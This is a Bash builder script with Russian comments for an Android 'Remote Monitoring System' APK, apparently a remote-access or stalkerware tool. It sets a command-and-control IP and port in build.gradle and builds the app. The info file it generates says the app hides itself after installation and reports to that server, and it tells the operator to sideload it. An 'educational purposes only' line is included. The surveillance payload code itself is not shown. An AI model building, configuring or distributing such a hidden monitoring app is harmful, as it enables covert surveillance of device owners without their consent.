#!/bin/bash

# ============================================================================
# Android Remote Monitoring System - APK Builder Script
# Автор: ReliableSecurity | Telegram: @ReliableSecurity
# ============================================================================

# Цвета для вывода
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Баннер
echo -e "${CYAN}
██████╗ ███████╗██╗     ██╗ █████╗ ██████╗ ██╗     ███████╗
██╔══██╗██╔════╝██║     ██║██╔══██╗██╔══██╗██║     ██╔════╝
██████╔╝█████╗  ██║     ██║███████║██████╔╝██║     █████╗  
██╔══██╗██╔══╝  ██║     ██║██╔══██║██╔══██╗██║     ██╔══╝  
██║  ██║███████╗███████╗██║██║  ██║██████╔╝███████╗███████╗
╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚══════╝
${NC}"

echo -e "${CYAN}🔨 Android Remote Monitoring System - APK Builder${NC}"
echo -e "${CYAN}👨‍💻 Автор: ReliableSecurity | 📞 @ReliableSecurity${NC}"
echo ""

# Проверка окружения
echo -e "${BLUE}📋 Проверка окружения...${NC}"

# Проверка наличия gradle
if ! command -v gradle &> /dev/null; then
    if ! command -v ./gradlew &> /dev/null; then
        echo -e "${RED}❌ Gradle не найден. Установите Gradle или используйте gradlew${NC}"
        exit 1
    else
        GRADLE_CMD="./gradlew"
    fi
else
    GRADLE_CMD="gradle"
fi

# Проверка наличия Android SDK
if [ -z "$ANDROID_HOME" ] && [ -z "$ANDROID_SDK_ROOT" ]; then
    echo -e "${RED}❌ Android SDK не найден. Установите переменную ANDROID_HOME или ANDROID_SDK_ROOT${NC}"
    exit 1
fi

echo -e "${GREEN}✅ Окружение готово${NC}"
echo ""

# Получение параметров от пользователя
echo -e "${YELLOW}📝 Настройка параметров сборки${NC}"

# IP адрес сервера
if [ -z "$1" ]; then
    echo -e "${CYAN}🌐 Введите IP адрес сервера управления:${NC}"
    read -p "IP (по умолчанию 192.168.1.100): " SERVER_IP
    SERVER_IP=${SERVER_IP:-192.168.1.100}
else
    SERVER_IP=$1
fi

# Порт сервера
if [ -z "$2" ]; then
    echo -e "${CYAN}🔌 Введите порт сервера управления:${NC}"
    read -p "Порт (по умолчанию 8080): " SERVER_PORT
    SERVER_PORT=${SERVER_PORT:-8080}
else
    SERVER_PORT=$2
fi

# Тип сборки
if [ -z "$3" ]; then
    echo -e "${CYAN}🔧 Выберите тип сборки:${NC}"
    echo "1) Debug (с отладочной информацией)"
    echo "2) Release (оптимизированная)"
    read -p "Выбор (1-2, по умолчанию 2): " BUILD_TYPE
    case $BUILD_TYPE in
        1) BUILD_TYPE="debug" ;;
        *) BUILD_TYPE="release" ;;
    esac
else
    BUILD_TYPE=$3
fi

echo ""
echo -e "${GREEN}📊 Параметры сборки:${NC}"
echo -e "  🌐 IP сервера: ${CYAN}$SERVER_IP${NC}"
echo -e "  🔌 Порт: ${CYAN}$SERVER_PORT${NC}"
echo -e "  🔧 Тип: ${CYAN}$BUILD_TYPE${NC}"
echo ""

# Подтверждение
read -p "$(echo -e ${YELLOW}🚀 Начать сборку APK? (y/n): ${NC})" -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo -e "${RED}❌ Сборка отменена${NC}"
    exit 1
fi

echo -e "${BLUE}🔨 НАЧИНАЕМ СБОРКУ APK...${NC}"

# Создание временного файла с конфигурацией
TEMP_CONFIG="/tmp/network_config.properties"
cat > $TEMP_CONFIG << EOF
# Временная конфигурация сети для сборки APK
server.ip=$SERVER_IP
server.port=$SERVER_PORT
build.timestamp=$(date +%s)
EOF

echo -e "${BLUE}📝 Обновление конфигурации сети...${NC}"

# Обновление build.gradle с новыми параметрами через buildConfigField
BUILD_GRADLE_FILE="android-app/app/build.gradle"
if [ -f "$BUILD_GRADLE_FILE" ]; then
    # Создание резервной копии
    cp "$BUILD_GRADLE_FILE" "$BUILD_GRADLE_FILE.backup"
    
    # Замена IP и порта в buildConfigField
    sed -i "s/buildConfigField \"String\", \"SERVER_IP\", \"\\\"[^\\\"]*\\\"\"/buildConfigField \"String\", \"SERVER_IP\", \"\\\"$SERVER_IP\\\"\"/" "$BUILD_GRADLE_FILE"
    sed -i "s/buildConfigField \"int\", \"SERVER_PORT\", \"[0-9]*\"/buildConfigField \"int\", \"SERVER_PORT\", \"$SERVER_PORT\"/" "$BUILD_GRADLE_FILE"
    
    # Обновляем BUILD_TIMESTAMP
    CURRENT_TIMESTAMP=$(date)
    sed -i "s/buildConfigField \"String\", \"BUILD_TIMESTAMP\", \"\\\".*\\\"\"/buildConfigField \"String\", \"BUILD_TIMESTAMP\", \"\\\"$CURRENT_TIMESTAMP\\\"\"/" "$BUILD_GRADLE_FILE"
    
    echo -e "${GREEN}✅ build.gradle обновлен с новыми параметрами${NC}"
else
    echo -e "${YELLOW}⚠️  build.gradle не найден, используются значения по умолчанию${NC}"
fi

# Переходим в директорию android-app для сборки
cd android-app

# Очистка предыдущих сборок
echo -e "${BLUE}🧹 Очистка предыдущих сборок...${NC}"
$GRADLE_CMD clean

# Сборка APK
echo -e "${BLUE}🔨 Сборка APK ($BUILD_TYPE)...${NC}"
if [ "$BUILD_TYPE" = "debug" ]; then
    $GRADLE_CMD assembleDebug
    BUILD_RESULT=$?
    APK_PATH="app/build/outputs/apk/debug/app-debug.apk"
    APK_NAME="RemoteMonitoring-${SERVER_IP//\./_}-${SERVER_PORT}-debug.apk"
else
    $GRADLE_CMD assembleRelease
    BUILD_RESULT=$?
    APK_PATH="app/build/outputs/apk/release/app-release-unsigned.apk"
    APK_NAME="RemoteMonitoring-${SERVER_IP//\./_}-${SERVER_PORT}-release.apk"
fi

# Возвращаемся в корневую директорию
cd ..

# Проверка успешности сборки
if [ $BUILD_RESULT -eq 0 ] && [ -f "android-app/$APK_PATH" ]; then
    echo -e "${GREEN}✅ Сборка завершена успешно!${NC}"
    
    # Создание папки для готовых APK
    OUTPUT_DIR="builds"
    mkdir -p "$OUTPUT_DIR"
    
    # Копирование и переименование APK
    cp "android-app/$APK_PATH" "$OUTPUT_DIR/$APK_NAME"
    
    # Получение информации о файле
    APK_SIZE=$(du -h "$OUTPUT_DIR/$APK_NAME" | cut -f1)
    APK_MD5=$(md5sum "$OUTPUT_DIR/$APK_NAME" | cut -d' ' -f1)
    
    echo ""
    echo -e "${GREEN}📱 APK готов к использованию!${NC}"
    echo -e "${GREEN}📁 Файл: ${CYAN}$OUTPUT_DIR/$APK_NAME${NC}"
    echo -e "${GREEN}📏 Размер: ${CYAN}$APK_SIZE${NC}"
    echo -e "${GREEN}🔐 MD5: ${CYAN}$APK_MD5${NC}"
    
    # Создание информационного файла
    INFO_FILE="$OUTPUT_DIR/${APK_NAME%.apk}.info"
    cat > "$INFO_FILE" << EOF
=================================
Android Remote Monitoring System
=================================
Автор: ReliableSecurity
Telegram: @ReliableSecurity
GitHub: https://github.com/ReliableSecurity/android-remote-monitoring

Параметры сборки:
- IP сервера: $SERVER_IP
- Порт сервера: $SERVER_PORT
- Тип сборки: $BUILD_TYPE
- Дата сборки: $(date)
- MD5: $APK_MD5

Инструкция по установке:
1. Включите "Неизвестные источники" в настройках Android
2. Скопируйте APK на устройство
3. Установите приложение
4. Приложение автоматически скроется после установки
5. Настройте сервер управления на $SERVER_IP:$SERVER_PORT

ВАЖНО: Используйте только в образовательных целях!
EOF
    
    echo -e "${GREEN}📋 Создан информационный файл: ${CYAN}$INFO_FILE${NC}"
    
else
    echo -e "${RED}❌ Ошибка при сборке APK${NC}"
    # Восстановление конфигурации из резервной копии
    if [ -f "$BUILD_GRADLE_FILE.backup" ]; then
        mv "$BUILD_GRADLE_FILE.backup" "$BUILD_GRADLE_FILE"
        echo -e "${YELLOW}🔄 Конфигурация восстановлена${NC}"
    fi
    exit 1
fi

# Восстановление оригинальной конфигурации
if [ -f "$BUILD_GRADLE_FILE.backup" ]; then
    mv "$BUILD_GRADLE_FILE.backup" "$BUILD_GRADLE_FILE"
    echo -e "${BLUE}🔄 Оригинальная конфигурация восстановлена${NC}"
fi

# Удаление временного файла
rm -f $TEMP_CONFIG

echo ""
echo -e "${GREEN}🎉 СБОРКА ЗАВЕРШЕНА УСПЕШНО!${NC}"
echo ""
echo -e "${CYAN}📚 Полезные команды:${NC}"
echo -e "  adb install $OUTPUT_DIR/$APK_NAME  ${BLUE}# Установка через ADB${NC}"
echo -e "  adb logcat | grep RemoteMonitor     ${BLUE}# Просмотр логов${NC}"
echo -e "  adb shell pm list packages | grep monitoring  ${BLUE}# Проверка установки${NC}"
echo ""
echo -e "${YELLOW}⚖️ Помните: используйте только в образовательных целях!${NC}"
echo -e "${CYAN}👨‍💻 Автор: ReliableSecurity | 📞 @ReliableSecurity${NC}"